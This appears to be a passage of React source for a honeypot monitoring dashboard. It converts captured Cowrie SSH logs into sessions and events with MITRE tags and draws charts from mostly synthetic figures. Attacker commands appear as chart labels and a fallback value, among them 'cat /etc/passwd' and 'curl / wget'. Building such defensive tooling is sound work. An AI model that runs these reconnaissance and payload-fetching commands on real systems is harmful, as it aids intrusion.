import { useEffect, useMemo, useState } from "react";
import ReactEChartsCore from "echarts-for-react/lib/core";
import * as echarts from "echarts/core";
import { BarChart, EffectScatterChart, GaugeChart, LineChart, PieChart } from "echarts/charts";
import { GeoComponent, GraphicComponent, GridComponent, LegendComponent, TooltipComponent } from "echarts/components";
import { CanvasRenderer } from "echarts/renderers";
import { feature } from "topojson-client";
import worldTopology from "world-atlas/countries-110m.json";
import {
  IconActivity,
  IconAdjustmentsHorizontal,
  IconAlertTriangle,
  IconArrowDownRight,
  IconArrowUpRight,
  IconBell,
  IconBolt,
  IconBook2,
  IconBrandDatabricks,
  IconBriefcase2,
  IconBug,
  IconChevronDown,
  IconChevronLeft,
  IconChevronRight,
  IconCircleCheck,
  IconClock,
  IconCloudLock,
  IconCode,
  IconDatabase,
  IconExternalLink,
  IconFileAnalytics,
  IconFileCode,
  IconFilter,
  IconFingerprint,
  IconFlag,
  IconGauge,
  IconKey,
  IconLayoutDashboard,
  IconLoader2,
  IconListDetails,
  IconLock,
  IconMap2,
  IconMenu2,
  IconPlayerPause,
  IconPlayerPlay,
  IconRadar,
  IconRefresh,
  IconRoute,
  IconSearch,
  IconServer2,
  IconSettings,
  IconPencil,
  IconShieldCheck,
  IconTrash,
  IconShieldLock,
  IconShieldSearch,
  IconSparkles,
  IconStack2,
  IconTargetArrow,
  IconTerminal2,
  IconTimeline,
  IconUserCircle,
  IconLogout,
  IconUsersGroup,
  IconWorld,
  IconX,
  IconZoomIn,
  IconZoomOut,
} from "@tabler/icons-react";
import {
  attackTrend,
  canaries,
  dataSources,
  demoIdentities,
  events,
  files,
  indicators,
  locations,
  mitreTactics,
  overviewMetrics,
  playbooks,
  sessions,
  slaSeries,
  syntheticMeta,
  threatGroups,
  timeline,
  topMitigations,
  topTechniques,
  mitreDatasets,
} from "./data/socData.js";
import { supabase } from "./lib/supabaseClient.js";

function isRealCliCommand(cmd) {
  if (!cmd || typeof cmd !== "string") return false;
  const trimmed = cmd.trim();
  if (trimmed === "Standard connection attempt." || trimmed === "Attacker disconnected or SSH session closed.") return false;
  if (trimmed.toLowerCase().includes("standard connection attempt")) return false;
  if (trimmed.toLowerCase().includes("attacker disconnected or ssh session closed")) return false;
  return true;
}

function normalizeSupabaseLog(log) {
  const rawSeverity = (log.threat_level || "INFO").toString().toUpperCase();
  let severity = "Low";
  if (rawSeverity === "CRITICAL") severity = "Critical";
  else if (rawSeverity === "HIGH") severity = "High";
  else if (rawSeverity === "MEDIUM") severity = "Medium";
  else if (rawSeverity === "LOW" || rawSeverity === "INFO") severity = "Low";

  const credentialsStr = `${log.username || 'N/A'}:${log.password || '*****'}`;
  const mitreTechnique = log.mitre_technique_id
    ? (log.attack_category ? `${log.mitre_technique_id} - ${log.attack_category}` : log.mitre_technique_id)
    : (log.attack_category ? `T1059.004 - ${log.attack_category}` : "T1059.004 - Command Execution");

  return {
    id: log.id || log.event_id || `EVT-SUPA-${Math.floor(Math.random() * 100000)}`,
    event_id: log.event_id || log.id,
    title: log.summary_en || log.command || "Honeypot Activity Detected",
    tactic: log.attack_category || "Reconnaissance",
    technique: mitreTechnique,
    severity: severity,
    status: "Logged",
    sourceIp: log.src_ip || "127.0.0.1",
    destination: "cowrie-decoy",
    protocol: "SSH",
    country: "Captured Log",
    city: "Realtime Honeypot",
    timestamp: log.timestamp ? new Date(log.timestamp).toISOString() : new Date().toISOString(),
    score: rawSeverity === "CRITICAL" ? 95 : rawSeverity === "HIGH" ? 80 : rawSeverity === "MEDIUM" ? 50 : 25,
    attempts: 1,
    analyst: "Gemini 2.5 CTI Agent",
    summary: log.summary_en || `Command executed: ${log.command || "N/A"}`,
    command: log.command || "N/A",
    username: log.username || "N/A",
    password: log.password || "*****",
    credentials: credentialsStr,
    summary_en: log.summary_en || ""
  };
}

function createSessionFromLog(log) {
  const rawSeverity = (log.threat_level || "HIGH").toString();
  const severity = rawSeverity.charAt(0).toUpperCase() + rawSeverity.slice(1).toLowerCase();
  const cmd = log.command || log.summary_en || "whoami && uname -a";

  return {
    id: `SES-LIVE-${log.id || log.event_id || Math.floor(Math.random() * 100000)}`,
    started: log.timestamp ? new Date(log.timestamp).toISOString() : new Date().toISOString(),
    duration: 120,
    sourceIp: log.src_ip || "127.0.0.1",
    country: "Realtime Honeypot",
    protocol: "SSH",
    sensor: "cowrie-decoy",
    severity: severity,
    status: "Captured",
    commandCount: 1,
    intent: log.summary_en || log.attack_category || "Live Honeypot Activity",
    commands: [
      {
        at: 5,
        input: cmd,
        output: "[realtime honeypot response captured & analyzed by Gemini 2.5]"
      }
    ]
  };
}

const SEVERITY_RANK = {
  CRITICAL: 4,
  HIGH: 3,
  MEDIUM: 2,
  LOW: 1,
  INFO: 1,
  Critical: 4,
  High: 3,
  Medium: 2,
  Low: 1
};

function aggregateAttackLogs(rawLogs) {
  if (!rawLogs || !rawLogs.length) return { events: [], sessions: [] };

  const sessionGroups = {};
  rawLogs.forEach((log) => {
    const rawSessionId = log.session_id || log.session || log.sessionId || log.src_ip || log.sourceIp || "default-session";
    if (!sessionGroups[rawSessionId]) sessionGroups[rawSessionId] = [];
    sessionGroups[rawSessionId].push(log);
  });

  const aggregatedEvents = [];
  const aggregatedSessions = [];

  Object.entries(sessionGroups).forEach(([rawSessionId, logs]) => {
    const sorted = [...logs].sort(
      (a, b) => new Date(a.timestamp || 0) - new Date(b.timestamp || 0)
    );

    const ip = sorted[0].src_ip || sorted[0].sourceIp || "127.0.0.1";
    const cleanSessionId = rawSessionId.toString().replaceAll(/[^a-zA-Z0-9_-]/g, "-");

    const isTerminated = sorted.some(
      (l) =>
        l.event_id === "cowrie.session.closed" ||
        l.event_type === "cowrie.session.closed" ||
        l.attack_category === "Session Terminated" ||
        l.command === "exit" ||
        l.command === "logout"
    );

    const batchSize = 8;
    const totalBatches = Math.ceil(sorted.length / batchSize);

    for (let i = 0; i < sorted.length; i += batchSize) {
      const batch = sorted.slice(i, i + batchSize);
      const batchNum = Math.floor(i / batchSize) + 1;
      const isLastBatch = batchNum === totalBatches;
      const batchStatus = (isTerminated && isLastBatch) ? "Closed" : "Active";

      const sessionId = totalBatches > 1 ? `SES-${cleanSessionId}-B${batchNum}` : `SES-${cleanSessionId}`;
      const eventId = totalBatches > 1 ? `EVT-${cleanSessionId}-B${batchNum}` : `EVT-${cleanSessionId}`;

      let highestRank = 0;
      let highestSeverity = "Low";
      batch.forEach((l) => {
        const sevStr = (l.threat_level || l.severity || "LOW").toString().toUpperCase();
        const rank = SEVERITY_RANK[sevStr] || 1;
        if (rank > highestRank) {
          highestRank = rank;
          highestSeverity = sevStr === "CRITICAL" ? "Critical" : sevStr === "HIGH" ? "High" : sevStr === "MEDIUM" ? "Medium" : "Low";
        }
      });

      const cliBatch = batch.filter((l) => isRealCliCommand(l.command || l.summary_en));
      const targetLogs = cliBatch.length > 0 ? cliBatch : batch;

      const commandsList = targetLogs.map((l, idx) => {
        const cmdInput = l.command || l.summary_en || `command_${idx + 1}`;
        return {
          at: idx * 6 + 3,
          input: cmdInput,
          output: "[realtime honeypot response captured & analyzed by Gemini 2.5]"
        };
      });

      const uniqueCreds = Array.from(
        new Set(
          batch
            .map((l) => `${l.username || 'N/A'}:${l.password || '*****'}`)
            .filter((c) => c !== "N/A:*****")
        )
      );
      const credsString = uniqueCreds.length > 0 ? uniqueCreds.join(", ") : `${batch[0].username || 'N/A'}:${batch[0].password || '*****'}`;

      const primaryCategory = batch[0].attack_category || batch[0].tactic || "Command Execution";
      const primaryMitre = batch[0].mitre_technique_id || batch[0].technique || "T1059.004";
      const mitreDisplay = primaryMitre.includes(" - ") ? primaryMitre : `${primaryMitre} - ${primaryCategory}`;

      const seqCommandsText = batch.map((l) => l.command).filter(Boolean).slice(0, 4).join(" ➔ ");
      const sessionNarrative = `SSH Session (${batch.length} commands from ${ip}). Sequence: ${seqCommandsText || primaryCategory}. Status: ${batchStatus}.`;

      const sessionObj = {
        id: sessionId,
        parentSessionId: rawSessionId,
        started: batch[0].timestamp ? new Date(batch[0].timestamp).toISOString() : new Date().toISOString(),
        duration: batch.length * 25,
        sourceIp: ip,
        country: "Realtime Honeypot",
        protocol: "SSH",
        sensor: "cowrie-decoy",
        severity: highestSeverity,
        status: batchStatus,
        commandCount: batch.length,
        intent: sessionNarrative,
        commands: commandsList
      };

      const eventObj = {
        id: eventId,
        event_id: eventId,
        sessionId: sessionId,
        title: `SSH Session (${batch.length} CLI inputs) - ${primaryCategory}`,
        tactic: primaryCategory,
        technique: mitreDisplay,
        severity: highestSeverity,
        status: batchStatus === "Closed" ? "Logged" : "Investigating",
        sourceIp: ip,
        destination: "cowrie-decoy",
        protocol: "SSH",
        country: "Captured Log",
        city: "Realtime Honeypot",
        timestamp: batch[batch.length - 1].timestamp ? new Date(batch[batch.length - 1].timestamp).toISOString() : new Date().toISOString(),
        score: highestRank * 24,
        attempts: batch.length,
        analyst: "Gemini 2.5 CTI Agent",
        summary: sessionNarrative,
        command: batch.map((l) => l.command).filter(Boolean).join(" ; ") || "Multi-command sequence",
        username: batch[0].username || "N/A",
        password: batch[0].password || "*****",
        credentials: credsString,
        summary_en: sessionNarrative,
        batchLogs: batch
      };

      aggregatedSessions.push(sessionObj);
      aggregatedEvents.push(eventObj);
    }
  });

  return { events: aggregatedEvents, sessions: aggregatedSessions };
}

const worldGeoJson = feature(worldTopology, worldTopology.objects.countries);
echarts.use([BarChart, EffectScatterChart, GaugeChart, LineChart, PieChart, GeoComponent, GraphicComponent, GridComponent, LegendComponent, TooltipComponent, CanvasRenderer]);
echarts.registerMap("soc-world", worldGeoJson);

const COLORS = {
  cyan: "#26d8cf",
  blue: "#5b7cfa",
  purple: "#a972ff",
  red: "#ff5c70",
  orange: "#f59e52",
  green: "#43d6a0",
  yellow: "#f2d46b",
  muted: "#7283a6",
  grid: "rgba(119, 145, 190, .12)",
};

const navItems = [
  ["overview", "Dashboard", IconLayoutDashboard],
  ["events", "Live events", IconActivity],
  ["map", "Attack map", IconWorld],
  ["mitre", "MITRE ATT&CK", IconTargetArrow],
  ["sessions", "Sessions & replay", IconTerminal2],
  ["iocs", "Indicators", IconFingerprint],
  ["files", "Files & sandbox", IconFileCode],
  ["canary", "Canary mesh", IconRadar],
  ["playbooks", "Threat Intelligence", IconBolt],
];

const viewCopy = {
  overview: ["Dashboard", "Command-level visibility across the isolated deception environment."],
  events: ["Live events", "Correlated detections from local sensors, enriched and prioritized in real time."],
  map: ["Global attack telemetry", "Interactive source geography from the last 24 hours of synthetic traffic."],
  mitre: ["MITRE ATT&CK heat map", "Observed tactics and techniques mapped from decoy evidence."],
  sessions: ["Session capture & replay", "Inspect attacker journeys without executing captured input."],
  iocs: ["Indicator intelligence", "Defanged, locally enriched indicators ready for analyst review."],
  files: ["Files & static sandbox", "Isolated file triage with static-only behavior summaries."],
  canary: ["Canary mesh", "Health and activation state of planted detection tokens."],
  playbooks: ["Threat Intelligence & Alerts", "Prioritized threat detection rules, alerts, and behavior indicators."],
};

const formatNumber = (value) => new Intl.NumberFormat("en-US", { notation: value > 9999 ? "compact" : "standard", maximumFractionDigits: 1 }).format(value);
const formatTimestamp = (value) => new Intl.DateTimeFormat("en", { month: "short", day: "2-digit", hour: "2-digit", minute: "2-digit", hour12: false }).format(new Date(value));
const formatDuration = (seconds) => `${Math.floor(seconds / 60)}m ${String(seconds % 60).padStart(2, "0")}s`;

function Severity({ value }) {
  return <span className={`severity severity-${value.toLowerCase()}`}><span />{value}</span>;
}

function Status({ value }) {
  const normalized = value.toLowerCase().replaceAll(" ", "-");
  return <span className={`status status-${normalized}`}>{value}</span>;
}

function Panel({ title, eyebrow, action, className = "", children }) {
  return (
    <section className={`panel ${className}`}>
      {(title || action) && (
        <header className="panel-header">
          <div>
            {eyebrow && <span className="eyebrow">{eyebrow}</span>}
            {title && <h2>{title}</h2>}
          </div>
          {action}
        </header>
      )}
      {children}
    </section>
  );
}

function Chart({ option, height = 220, className = "" }) {
  return <ReactEChartsCore echarts={echarts} className={className} option={option} style={{ height }} opts={{ renderer: "canvas" }} notMerge lazyUpdate />;
}

function InteractiveSparkline({ values, label, strokeColor, fillColor }) {
  const [hoverIndex, setHoverIndex] = useState(null);
  const [tooltipPos, setTooltipPos] = useState({ leftPct: 50 });

  if (!values || values.length === 0) return null;

  const min = Math.min(...values);
  const max = Math.max(...values);
  const range = max - min || 1;
  const width = 300;
  const height = 46;

  const pts = values.map((val, idx) => {
    const x = (idx / (values.length - 1)) * width;
    const y = (height - 6) - ((val - min) / range) * (height - 12) + 3;
    return { x, y, value: val };
  });

  const getBezierPath = (points) => {
    if (points.length === 0) return "";
    let path = `M ${points[0].x} ${points[0].y}`;
    for (let i = 0; i < points.length - 1; i++) {
      const cpX1 = points[i].x + (points[i + 1].x - points[i].x) / 2;
      const cpY1 = points[i].y;
      const cpX2 = points[i].x + (points[i + 1].x - points[i].x) / 2;
      const cpY2 = points[i + 1].y;
      path += ` C ${cpX1} ${cpY1}, ${cpX2} ${cpY2}, ${points[i + 1].x} ${points[i + 1].y}`;
    }
    return path;
  };

  const linePath = getBezierPath(pts);
  const areaPath = linePath ? `${linePath} L ${width} ${height} L 0 ${height} Z` : "";
  const sanitizedId = label ? label.replace(/[^a-zA-Z0-9]/g, "-") : "default";
  const gradId = `spark-grad-${sanitizedId}`;

  const handleMouseMove = (e) => {
    const rect = e.currentTarget.getBoundingClientRect();
    const clientX = e.clientX - rect.left;
    const pct = Math.max(0, Math.min(1, clientX / rect.width));
    const idx = Math.round(pct * (values.length - 1));
    setHoverIndex(idx);

    const ptPct = (pts[idx].x / width) * 100;
    setTooltipPos({ leftPct: ptPct });
  };

  const handleMouseLeave = () => {
    setHoverIndex(null);
  };

  const hoverPt = hoverIndex !== null ? pts[hoverIndex] : null;
  const timeLabels = ["11:00 AM", "11:10 AM", "11:20 AM", "11:30 AM", "11:40 AM", "11:50 AM", "12:00 PM"];
  const timeStr = hoverIndex !== null ? (timeLabels[hoverIndex % timeLabels.length] || `Point ${hoverIndex + 1}`) : "";

  return (
    <div
      style={{ position: 'relative', width: '100%', height: '100%', cursor: 'crosshair' }}
      onMouseMove={handleMouseMove}
      onMouseLeave={handleMouseLeave}
    >
      <svg
        viewBox={`0 0 ${width} ${height}`}
        preserveAspectRatio="none"
        style={{ width: '100%', height: '100%', display: 'block', overflow: 'visible' }}
      >
        <defs>
          <linearGradient id={gradId} x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stopColor={strokeColor} stopOpacity="0.25" />
            <stop offset="100%" stopColor={strokeColor} stopOpacity="0.0" />
          </linearGradient>
        </defs>

        {areaPath && <path d={areaPath} fill={`url(#${gradId})`} />}
        {linePath && <path d={linePath} fill="none" stroke={strokeColor} strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />}

        {hoverPt && (
          <>
            <line
              x1={hoverPt.x}
              y1={0}
              x2={hoverPt.x}
              y2={height}
              stroke="rgba(255, 255, 255, 0.3)"
              strokeDasharray="2,2"
              strokeWidth={1}
            />
            <circle
              cx={hoverPt.x}
              cy={hoverPt.y}
              r={6}
              fill={strokeColor}
              opacity={0.35}
            />
            <circle
              cx={hoverPt.x}
              cy={hoverPt.y}
              r={3.5}
              fill="#ffffff"
              stroke={strokeColor}
              strokeWidth={2}
            />
          </>
        )}
      </svg>

      {hoverPt && (
        <div
          style={{
            position: 'absolute',
            left: `${Math.max(15, Math.min(85, tooltipPos.leftPct))}%`,
            top: '-24px',
            transform: 'translateX(-50%)',
            background: '#070d18',
            border: `1px solid ${strokeColor}`,
            borderRadius: '5px',
            padding: '2px 7px',
            color: '#edf4ff',
            fontSize: '9.5px',
            fontWeight: '600',
            fontFamily: 'Inter, sans-serif',
            whiteSpace: 'nowrap',
            pointerEvents: 'none',
            zIndex: 20,
            boxShadow: `0 4px 14px rgba(0,0,0,0.7), 0 0 8px ${strokeColor}44`,
            display: 'flex',
            alignItems: 'center',
            gap: '5px'
          }}
        >
          <span style={{ color: '#7e8da8', fontSize: '8.5px' }}>{timeStr}:</span>
          <span style={{ color: strokeColor, fontWeight: '700' }}>{hoverPt.value}</span>
        </div>
      )}
    </div>
  );
}

function MiniTrend({ values, color = COLORS.cyan }) {
  return (
    <Chart
      height={42}
      option={{
        animation: false,
        grid: { left: 0, right: 0, top: 3, bottom: 2 },
        xAxis: { type: "category", show: false, data: values.map((_, i) => i) },
        yAxis: { type: "value", show: false, min: (v) => v.min * 0.92 },
        series: [{ type: "line", data: values, smooth: 0.4, symbol: "none", lineStyle: { color, width: 1.5 }, areaStyle: { color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{ offset: 0, color: `${color}44` }, { offset: 1, color: `${color}00` }]) } }],
      }}
    />
  );
}

function MetricCard({ label, value, delta, positive = true, accent = COLORS.cyan, trend, subLabel, interactiveSparkline = true, strokeColor, fillColor }) {
  const effectiveStroke = strokeColor || accent;
  const effectiveFill = fillColor || `${accent}25`;

  return (
    <article className="metric-card">
      <div className="metric-card-content">
        <div className="metric-top"><span>{label}</span><span className="metric-accent" style={{ background: accent }} /></div>
        <div className="metric-value-row">
          <strong>{value}</strong>
          {delta && (
            <span className={positive ? "delta positive" : "delta negative"}>
              {typeof delta === "string" ? (
                <>
                  {positive ? <IconArrowUpRight size={13} /> : <IconArrowDownRight size={13} />}
                  {delta}
                </>
              ) : (
                delta
              )}
            </span>
          )}
        </div>
        {subLabel && <small style={{ color: '#7384a2', fontSize: '9px', marginTop: '1px', display: 'block', minHeight: '12px' }}>{subLabel}</small>}
      </div>

      {trend && (
        <div className="metric-sparkline-wrap">
          <InteractiveSparkline values={trend} label={label} strokeColor={effectiveStroke} fillColor={effectiveFill} />
        </div>
      )}
    </article>
  );
}

function Segmented({ options, value, onChange, label }) {
  return (
    <div className="segmented" role="group" aria-label={label}>
      {options.map((option) => <button key={option} className={value === option ? "active" : ""} onClick={() => onChange(option)}>{option}</button>)}
    </div>
  );
}

function TableEmpty() {
  return <div className="empty-state"><IconShieldSearch size={28} /><strong>No matching telemetry</strong><span>Adjust search or filter criteria.</span></div>;
}

function Overview({ period, setPeriod, onEvent, onDeleteEvent, eventsList }) {
  const [exporting, setExporting] = useState(false);
  const handleExport = () => {
    setExporting(true);
    setTimeout(() => {
      window.print();
      setExporting(false);
    }, 1800);
  };
  const factor = period === "Daily" ? 1 : period === "Weekly" ? 6.8 : 29.2;
  const periodTrend = timeline.map((item) => Math.round(item.inbound * factor));
  const chartText = { color: "#6f819f", fontFamily: "Inter, sans-serif", fontSize: 10 };

  const meanDwellTime = period === "Daily" ? "18m" : period === "Weekly" ? "43m" : "1h 12m";
  const interactionDepth = period === "Daily" ? "34" : period === "Weekly" ? "81" : "115";
  const uniqueIps = period === "Daily" ? "418 IPs" : period === "Weekly" ? "2,840 IPs" : "12,200 IPs";
  const iocsExtracted = formatNumber(Math.round(4250 * (factor / 1)));

  const dwellTrend = period === "Daily" ? [28, 26, 21, 23, 19, 18, 18] : period === "Weekly" ? [69, 61, 55, 58, 49, 47, 43] : [92, 88, 85, 87, 78, 74, 72];
  const resolveTrend = period === "Daily" ? [45, 41, 38, 40, 35, 34, 34] : period === "Weekly" ? [99, 92, 89, 93, 84, 81, 81] : [145, 138, 132, 135, 122, 118, 115];
  const timeTrend = [22, 29, 31, 35, 41, 46, 50].map(x => Math.round(x * (factor / 6.8)));
  const dollarsTrend = [31, 34, 36, 35, 39, 42, 44].map(x => Math.round(x * (factor / 6.8)));

  const workloadTotal = period === "Daily" ? 46 : period === "Weekly" ? 312 : 1343;
  const sshCount = period === "Daily" ? 18 : period === "Weekly" ? 122 : 526;
  const webExploitCount = period === "Daily" ? 12 : period === "Weekly" ? 82 : 350;
  const malwareCount = period === "Daily" ? 8 : period === "Weekly" ? 54 : 234;
  const reconCount = period === "Daily" ? 5 : period === "Weekly" ? 34 : 146;
  const rdpSprayCount = workloadTotal - (sshCount + webExploitCount + malwareCount + reconCount);

  const workloadData = [
    ["SSH Brute-force", sshCount],
    ["Web Exploitation & Traversal", webExploitCount],
    ["Malware Payload Drop", malwareCount],
    ["Network Reconnaissance", reconCount],
    ["RDP Credential Spray", rdpSprayCount]
  ];
  const maxWorkloadCount = Math.max(...workloadData.map(d => d[1]), 1);

  const perfGrid = period === "Daily"
    ? [["28m", "Mean time to resolve"], ["42m", "Max time to resolve"], ["1m 12s", "Mean time to triage"], ["18m", "Mean dwell time"]]
    : period === "Weekly"
      ? [["32m", "Mean time to resolve"], ["1h 05m", "Max time to resolve"], ["1m 18s", "Mean time to triage"], ["17m", "Mean dwell time"]]
      : [["45m", "Mean time to resolve"], ["1h 48m", "Max time to resolve"], ["2m 05s", "Mean time to triage"], ["28m", "Mean dwell time"]];

  const scaledDataSources = dataSources.map(([name, countStr, percent]) => {
    const staticValues = {
      "Cowrie SSH": "1.8K",
      "Suricata EVE": "1.5K",
      "Web decoy": "1.2K",
      "Canary mesh": "950",
      "RDP lure": "820",
      "Mail sensor": "540"
    };
    const formattedVal = staticValues[name] || countStr;
    return [name, formattedVal, percent];
  });

  const timelineXAxis = period === "Daily"
    ? timeline.map((d) => d.label)
    : period === "Weekly"
      ? ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
      : ["Week 1", "Week 2", "Week 3", "Week 4"];

  const timelineInbound = period === "Daily"
    ? timeline.map((d) => d.inbound)
    : period === "Weekly"
      ? [1150, 1280, 1190, 1420, 1310, 980, 1060]
      : [4900, 5600, 5100, 6200];

  const timelineBlocked = period === "Daily"
    ? timeline.map((d) => d.blocked)
    : period === "Weekly"
      ? [780, 890, 810, 980, 910, 650, 710]
      : [3200, 3800, 3400, 4100];

  const timelineCritical = period === "Daily"
    ? timeline.map((d) => d.critical)
    : period === "Weekly"
      ? [35, 48, 42, 59, 51, 24, 30]
      : [140, 190, 160, 220];

  const lineOption = {
    animationDuration: 500,
    tooltip: { trigger: "axis", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    grid: { left: 36, right: 16, top: 18, bottom: 28 },
    xAxis: { type: "category", data: timelineXAxis, boundaryGap: false, axisLine: { lineStyle: { color: COLORS.grid } }, axisLabel: { ...chartText, interval: period === "Daily" ? 3 : 0 }, axisTick: { show: false } },
    yAxis: { type: "value", splitLine: { lineStyle: { color: COLORS.grid } }, axisLabel: chartText },
    series: [
      { name: "Inbound", type: "line", data: timelineInbound, symbol: "none", smooth: 0.28, itemStyle: { color: COLORS.blue }, lineStyle: { color: COLORS.blue, width: 2 }, areaStyle: { color: "rgba(91,124,250,.08)" } },
      { name: "Blocked", type: "line", data: timelineBlocked, symbol: "none", smooth: 0.3, itemStyle: { color: COLORS.purple }, lineStyle: { color: COLORS.purple, width: 1.5 } },
      { name: "Critical", type: "line", data: timelineCritical, symbol: "none", smooth: 0.3, itemStyle: { color: COLORS.red }, lineStyle: { color: COLORS.red, width: 1.5 } },
    ],
  };

  const slaXAxis = period === "Daily"
    ? timeline.map((d) => d.label)
    : period === "Weekly"
      ? ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
      : ["Week 1", "Week 2", "Week 3", "Week 4"];

  const slaMetData = period === "Daily"
    ? timeline.map((d, index) => 92 + (index % 3) - (index % 5 === 0 ? 3 : 0))
    : period === "Weekly"
      ? [93, 91, 95, 92, 94, 91, 90]
      : [91, 93, 90, 92];

  const slaTargetData = period === "Daily"
    ? Array(24).fill(92)
    : period === "Weekly"
      ? Array(7).fill(92)
      : Array(4).fill(92);

  const slaOption = {
    tooltip: { trigger: "axis", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    grid: { left: 34, right: 16, top: 12, bottom: 25 },
    xAxis: { type: "category", data: slaXAxis, boundaryGap: false, axisLabel: { ...chartText, interval: period === "Daily" ? 3 : 0 }, axisLine: { lineStyle: { color: COLORS.grid } }, axisTick: { show: false } },
    yAxis: { min: 75, max: 100, splitLine: { lineStyle: { color: COLORS.grid } }, axisLabel: { ...chartText, formatter: "{value}%" } },
    series: [
      { name: "Engagement Rate", type: "line", data: slaMetData, smooth: 0.36, symbol: "none", itemStyle: { color: COLORS.green }, lineStyle: { color: COLORS.green, width: 2 }, areaStyle: { color: "rgba(67,214,160,.08)" } }
    ],
  };

  const statusHigh = period === "Daily" ? 26 : period === "Weekly" ? 180 : 680;
  const statusMedium = period === "Daily" ? 24 : period === "Weekly" ? 170 : 620;
  const statusLow = period === "Daily" ? 22 : period === "Weekly" ? 150 : 580;
  const statusClosed = period === "Daily" ? 23 : period === "Weekly" ? 150 : 570;
  const statusTotal = statusHigh + statusMedium + statusLow + statusClosed;

  const statusOption = {
    tooltip: { trigger: "item", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    series: [{
      type: "pie", radius: ["63%", "82%"], center: ["50%", "50%"], label: { show: false }, itemStyle: { borderColor: "#111b2e", borderWidth: 3, borderRadius: 4 }, data: [
        { value: statusHigh, name: "Critical", itemStyle: { color: "#EF4444" } },
        { value: statusMedium, name: "High", itemStyle: { color: "#F87171" } },
        { value: statusLow, name: "Medium", itemStyle: { color: "#F59E0B" } },
        { value: statusClosed, name: "Low / Info", itemStyle: { color: "#60A5FA" } },
      ]
    }],
    graphic: [{ type: "text", left: "center", top: "42%", style: { text: String(statusTotal), fill: "#f2f7ff", font: "700 24px Inter" } }, { type: "text", left: "center", top: "57%", style: { text: "EVENTS", fill: "#7183a3", font: "9px Inter" } }],
  };

  const barXAxis = period === "Daily"
    ? timeline.slice(12).map((d) => d.label)
    : period === "Weekly"
      ? ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
      : ["Week 1", "Week 2", "Week 3", "Week 4"];

  const barData = period === "Daily"
    ? [3, 4, 3, 5, 4, 2, 3, 4, 3, 4, 3, 2]
    : period === "Weekly"
      ? [38, 42, 39, 45, 43, 35, 38]
      : [210, 240, 215, 235];

  const closedData = period === "Daily"
    ? [1, 2, 2, 2, 2, 1, 1, 2, 2, 2, 2, 1]
    : period === "Weekly"
      ? [19, 21, 19, 23, 21, 18, 19]
      : [105, 120, 107, 118];

  const commandNames = ["uname -a", "cat /etc/passwd", "chmod +x", "curl / wget"];
  const commandCounts = [
    Math.round(18 * (factor / 6.8)),
    Math.round(29 * (factor / 6.8)),
    Math.round(38 * (factor / 6.8)),
    Math.round(45 * (factor / 6.8))
  ];
  const attackerCommandsOption = {
    tooltip: { trigger: "axis", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    grid: { left: 90, right: 16, top: 12, bottom: 20 },
    xAxis: { type: "value", splitLine: { lineStyle: { color: COLORS.grid } }, axisLabel: chartText },
    yAxis: { type: "category", data: commandNames, axisLabel: { ...chartText, fontSize: 8 }, axisLine: { lineStyle: { color: COLORS.grid } }, axisTick: { show: false } },
    series: [{ type: "bar", data: commandCounts, barMaxWidth: 10, itemStyle: { color: new echarts.graphic.LinearGradient(1, 0, 0, 0, [{ offset: 0, color: COLORS.blue }, { offset: 1, color: COLORS.purple }]), borderRadius: [0, 3, 3, 0] } }],
  };

  const sessionsOption = {
    tooltip: { trigger: "axis", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    grid: { left: 30, right: 10, top: 12, bottom: 24 },
    xAxis: { type: "category", data: barXAxis, axisLabel: chartText, axisLine: { lineStyle: { color: COLORS.grid } }, axisTick: { show: false } },
    yAxis: { type: "value", splitLine: { lineStyle: { color: COLORS.grid } }, axisLabel: chartText },
    series: [{ type: "bar", data: closedData, barMaxWidth: 14, itemStyle: { color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{ offset: 0, color: COLORS.purple }, { offset: 1, color: COLORS.blue }]), borderRadius: [3, 3, 0, 0] } }],
  };

  return (
    <>
      <div className="page-actions">
        <Segmented options={["Daily", "Weekly", "Monthly"]} value={period} onChange={setPeriod} label="Reporting period" />
        <button className="ghost-button" onClick={handleExport} disabled={exporting}>
          {exporting ? (
            <>
              <IconLoader2 size={16} className="spin" />
              Exporting...
            </>
          ) : (
            <>
              <IconFileAnalytics size={16} />
              Export report
            </>
          )}
        </button>
      </div>
      <div className="metrics-grid five">
        <MetricCard label="Captured Threats" value={formatNumber(Math.round(overviewMetrics.incidents * (factor / 29.2)))} delta="8.4%" trend={periodTrend.slice(2, 10)} />
        <MetricCard label="Avg Session Duration" value={meanDwellTime} delta="12.1%" positive accent={COLORS.green} trend={dwellTrend} />
        <MetricCard label="Interaction Depth" value={interactionDepth} delta="6.8%" positive accent={COLORS.green} trend={resolveTrend} subLabel="Avg steps per session" />
        <MetricCard label="Unique IPs Logged" value={uniqueIps} delta="10.6%" accent={COLORS.purple} trend={timeTrend} />
        <MetricCard label="IOCs Extracted" value={iocsExtracted} delta="2.1%" accent={COLORS.green} trend={dollarsTrend} />
      </div>

      <div className="overview-grid top">
        <Panel title={period === "Daily" ? "Decoy Engagement Rate (24h)" : period === "Weekly" ? "Decoy Engagement Rate (7d)" : "Decoy Engagement Rate (30d)"} eyebrow="Interactive attacker traffic" action={<div className="inline-stat"><strong>{period === "Daily" ? "94.2%" : period === "Weekly" ? "91.8%" : "89.5%"}</strong><span>Avg Engagement</span></div>}><Chart option={slaOption} height={238} /></Panel>
        <Panel title="Attacks by Threat Category" eyebrow="Threat categories" action={<span className="count-label"><strong>{workloadTotal}</strong> total</span>}>
          <div className="workload-list">
            {workloadData.map(([name, count]) => {
              const widthPct = Math.round((count / maxWorkloadCount) * 100);
              return (
                <div className="workload-row" key={name}>
                  <div><span>{name}</span><strong>{count}</strong></div>
                  <div className="progress"><i style={{ width: `${widthPct}%` }} /></div>
                </div>
              );
            })}
          </div>
        </Panel>
